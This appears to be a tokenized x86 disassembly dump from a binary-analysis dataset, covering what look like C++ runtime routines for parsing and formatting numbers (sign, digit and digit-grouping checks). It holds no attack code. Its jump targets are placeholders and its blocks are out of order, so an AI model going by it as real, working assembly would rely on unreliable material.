lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001ccfc
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1004f558
push 0x198
mov eax sub_10086008
call sub_1003fae8
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1a0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x184 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1004f4bb
pop ecx
lea ecx [ ebp - 0x198 ]
lea eax [ ebp - 0x19c ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10026251
pop ecx
lea ecx [ ebp - 0x19c ]
jmp r-xdata
mov ecx [ ebp - 0x17c ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10034a80
and [ ebp - 0x38 ] 0x0
push 0xf
pop edi
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] 0x0
and [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] 0x0
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x18c ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x17c ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x18c ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10021370
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov esi [ ebp - 0x1a0 ]
mov [ esi + 0x14 ] edi
lea eax [ ebp - 0x64 ]
xor edi edi
mov [ esi + 0x10 ] edi
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
push edi
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1002c8c0
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1002c8c0
mov eax esi
call sub_1004642f
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x17c ]
cmp [ ebp - 0x161 ] 0x0
push 0xf
pop edi
je r-xdata
mov ecx [ ebp - 0x184 ]
lea eax [ ebp - 0x190 ]
push eax
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10034ec0
pop ecx
lea ecx [ ebp - 0x190 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10034a80
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1006e90e
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax 0x7
je r-xdata
push 0x2d
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_10050540
mov ebx eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x184 ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x17c ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
inc ebx
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x9c ]
push eax
call sub_10055b84
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
and [ ebp - 0x178 ] 0x0
mov ecx ebx
call [ eax + 0x1c ]
mov [ ebp - 0x180 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_1000ff3d
cmp [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0xb
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
movzx eax [ esi + 0x5 ]
mov ecx [ edi + 0x10 ]
test [ ecx + eax * 2 ] 0x48
je r-xdata
mov ecx esi
call sub_10045d3b
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10045d3b
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x144 ]
push eax
call sub_10055b84
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
mov bl al
test bl bl
je r-xdata
mov ecx [ ebp - 0x38 ]
add ecx eax
cmp ebx ecx
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_10021370
cmp [ esi + 0x4 ] al
jne r-xdata
cmp al [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1002c8c0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
mov bl al
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov al [ esi + 0x5 ]
cmp al [ ebx ]
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov al [ esi + 0x5 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_1002c8c0
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005f1e2
jmp r-xdata
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
add eax [ ebp - 0x1c ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_10055017
or [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x8
cmp [ eax + 0x10 ] ebx
jbe r-xdata
mov ecx esi
call sub_1005f1e2
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xb8 ]
push eax
call sub_10055b84
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10021bf0
push ebx
lea ecx [ ebp - 0xb8 ]
jmp r-xdata
xor ebx ebx
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
and [ ebp - 0x1c ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] 0x0
call sub_100405c0
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
xor edi edi
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x162 ] 0x0
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xf0 ]
push eax
call sub_10055017
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1002c8c0
jmp r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
lea ecx [ ebp - 0x80 ]
jmp r-xdata
mov edi eax
sub edi [ ebp - 0x178 ]
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
cmp al [ edi ]
jne r-xdata
mov ecx esi
call sub_10045d3b
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1002c8c0
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x30
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1004ca10
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
inc edi
call sub_1005f1e2
cmp [ ebp - 0x162 ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push ebx
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1002c8c0
mov al [ esi + 0x5 ]
mov [ ebp - 0x162 ] 0x1
cmp [ edi ] al
je r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x5 ]
mov [ ebp - 0x188 ] al
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1004ca10
mov ecx esi
call sub_1005f1e2
mov ecx esi
call sub_10045d3b
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1002c8c0
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0xd4 ]
push eax
call sub_10055b84
mov edi [ eax + 0x10 ]
push ebx
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1002c8c0
cmp edi ebx
je r-xdata
mov ecx esi
call sub_1005f1e2
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x160 ]
push eax
call sub_10055017
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0xa
call sub_10021bf0
push ebx
push 0x1
lea ecx [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x3
call sub_1002c8c0
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
mov eax [ ebp - 0x178 ]
cmp eax [ ebp - 0x180 ]
jge r-xdata
mov eax [ ebp - 0x180 ]
cmp [ ebp - 0x178 ] eax
jge r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xb
call sub_1002c8c0
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x10c ]
push eax
call sub_10055017
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x10c ]
call sub_1002c8c0
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x5 ] bl
jne r-xdata
mov ecx esi
call sub_10045d3b
mov al [ esi + 0x5 ]
mov [ ebp - 0x194 ] al
push [ ebp - 0x194 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1004ca10
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x16c ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov al [ esi + 0x5 ]
mov [ ebp - 0x1a4 ] al
push [ ebp - 0x1a4 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_1004ca10
inc [ ebp - 0x178 ]
mov ecx esi
call sub_10045d3b
sub_1004fe90
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10086d88
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x30 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x28 ]
mov [ esp + 0x3c ] eax
mov [ esp + 0x24 ] edx
mov edx [ ebp + 0x2c ]
lea eax [ esp + 0x4c ]
push eax
mov [ esp + 0x44 ] ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x14 ] ebx
call sub_10013950
push eax
mov [ esp + 0x9c ] 0x0
call sub_10002fc0
mov [ esp + 0x48 ] eax
mov [ esp + 0x9c ] 0xffffffff
mov eax [ esp + 0x50 ]
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x6c ]
push ecx
mov ecx [ esp + 0x48 ]
call sub_100101d0
mov ecx [ esp + 0x44 ]
mov [ esp + 0x98 ] 0x1
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
movzx ecx ax
xor eax eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] eax
mov [ esp + 0x50 ] al
mov [ esp + 0x98 ] 0x2
lea edx [ edi + 0x8 ]
push edx
mov [ esp + 0x3c ] eax
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push eax
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x3c ] 0x30
call sub_10026eb0
mov al [ esi ]
add esp 0x14
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x24 ] eax
call sub_10034e98
mov ecx [ esp + 0x20 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x1c ] 0x0
cmp al 0x2d
jne r-xdata
mov eax [ ecx + 0x4 ]
neg eax
sbb eax eax
not eax
and eax ecx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
call sub_10069747
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esp + 0x80 ]
mov eax [ esp + 0x6c ]
mov ecx eax
cmp edx 0x10
jae r-xdata
mov [ esp + 0x18 ] eax
call sub_1002f11b
mov eax [ eax ]
mov cl [ eax ]
push ebx
push 0x65
push esi
mov [ esp + 0x38 ] cl
mov [ esp + 0x39 ] 0x65
call sub_1007f360
movsx edx [ esp + 0x38 ]
add esp 0xc
push ebx
push edx
push esi
mov [ esp + 0x3c ] eax
call sub_1007f360
add esp 0xc
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
dec eax
mov [ ecx + 0x4 ] eax
cmp [ ecx ] 0x7f
je r-xdata
lea ecx [ esp + 0x6c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x40 ]
lea eax [ ebx + ecx ]
add eax [ esp + 0x3c ]
mov ecx [ edx + 0x20 ]
add eax [ esp + 0x24 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
cmp edx 0x10
jae r-xdata
mov [ esp + 0x14 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x6c ]
movsx ecx [ esp + 0x2c ]
push ebx
push ecx
push esi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push ebx
push esi
lea ecx [ esp + 0x58 ]
call sub_1002e070
mov ebx [ esp + 0x30 ]
test ebx ebx
jne r-xdata
push ebx
push 0x65
push esi
call sub_1007f360
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x20 ]
mov ecx [ ebp + 0x14 ]
sub eax esi
push edx
mov edx [ ebp + 0x10 ]
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push ecx
push edx
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_100344d0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x40 ]
add esp 0x1c
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10070c30
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x5c ]
mov [ ebp + 0x14 ] edx
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
add esp 0x18
call edx
mov ecx [ ebp + 0x10 ]
movzx eax ax
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push eax
push ecx
lea edx [ esp + 0x40 ]
push edx
push edi
call sub_10070c30
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x54 ]
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x54 ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x58 ]
push eax
push edi
call sub_10070c30
mov ecx [ eax ]
add esi ebx
add esp 0x30
sub [ esp + 0x10 ] ebx
mov ebx [ esp + 0x10 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
cmp [ esp + 0x1c ] 0x0
jbe r-xdata
mov edx [ esp + 0x14 ]
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push eax
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10070c30
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
jmp r-xdata
sub ecx eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ esp + 0x18 ]
push 0x30
push eax
lea ecx [ esp + 0x58 ]
call sub_1004ca10
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push eax
push ebx
push esi
push ecx
push edx
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_100344d0
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ esp + 0x34 ]
add esp 0x1c
push ecx
mov [ ebp + 0x14 ] edx
mov edx [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10070c30
mov ecx [ eax ]
mov edx [ esp + 0x58 ]
mov esi [ esp + 0x60 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ esp + 0x2c ]
push edx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push esi
push edi
mov [ ebp + 0x14 ] eax
call sub_10070c30
mov edi 0x10
add esp 0x30
cmp [ esp + 0x64 ] edi
jb r-xdata
mov edx [ ebp + 0x14 ]
sub eax esi
lea ebx [ eax + 0x1 ]
mov eax [ esp + 0x20 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push esi
push edx
push eax
lea ecx [ esp + 0x44 ]
push ecx
push edi
call sub_100344d0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0x34 ]
add esp 0x1c
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ esp + 0x3c ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push ecx
push edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edi
call sub_10070c30
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0x58 ]
add esp 0x18
test [ edx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov [ esp + 0x18 ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edi
call sub_10070c30
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push 0x1
push esi
push eax
push ecx
lea edx [ esp + 0x40 ]
push edx
push edi
call sub_1006e7c0
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
inc esi
dec ebx
mov [ ebp + 0x14 ] edx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x2c ] 0x0
add esp 0x18
mov eax [ edx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx [ esp + 0x18 ]
push 0x30
push edx
sub ebx esi
push ebx
lea ecx [ esp + 0x5c ]
call sub_10050540
mov ecx [ esp + 0x24 ]
push 0x30
push ecx
lea ecx [ esp + 0x58 ]
call sub_1004ca10
mov [ esp + 0x24 ] 0x0
mov ebx [ esp + 0x14 ]
push 0x30
test ebx ebx
jne r-xdata
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] ebx
mov [ esp + 0x50 ] bl
cmp [ esp + 0x80 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ eax ]
push 0x1
push ecx
mov ecx [ eax + 0x4 ]
push ecx
push edx
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_1006e7c0
mov ecx [ eax ]
add esi ebx
add esp 0x18
sub [ esp + 0x10 ] ebx
mov ebx [ esp + 0x10 ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
mov ecx r--data
mov ecx [ esp + 0x40 ]
sub ebx esi
push ecx
lea edx [ ebx + 0x1 ]
push edx
lea ecx [ esp + 0x5c ]
call sub_10050540
mov eax [ esp + 0x24 ]
push 0x30
push eax
push ebx
lea ecx [ esp + 0x5c ]
call sub_10050540
mov [ esp + 0x3c ] 0x0
mov eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x58 ]
call sub_1004ca10
jmp r-xdata
mov eax esi
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ esp + 0x6c ]
push ecx
call sub_100187af
add esp 0x4
cmp [ esp + 0x64 ] eax
mov eax [ esp + 0x50 ]
jae r-xdata
lea ebx [ esp + 0x6c ]
mov ebx [ esp + 0x6c ]
mov eax 0x10
mov [ esp + 0x24 ] 0x0
cmp [ esp + 0x80 ] eax
jae r-xdata
lea ecx [ esp + 0x2c ]
push ecx
push eax
call sub_1007f580
mov esi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ esp + 0x50 ]
cmp [ esp + 0x64 ] 0x10
mov esi [ esp + 0x50 ]
jae r-xdata
test al al
jle r-xdata
mov eax [ esp + 0x60 ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x10 ] eax
mov ebx eax
lea esi [ esp + 0x50 ]
mov edx esi
sub edx [ esp + 0x1c ]
movsx eax al
cmp eax edx
jae r-xdata
push 0x0
sub esi eax
push 0x1
push esi
lea ecx [ esp + 0x5c ]
call sub_10050540
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_100504f0
push esi
mov esi ecx
cmp [ esi + 0xec ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xb8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xbc ]
test eax eax
je r-xdata
push eax
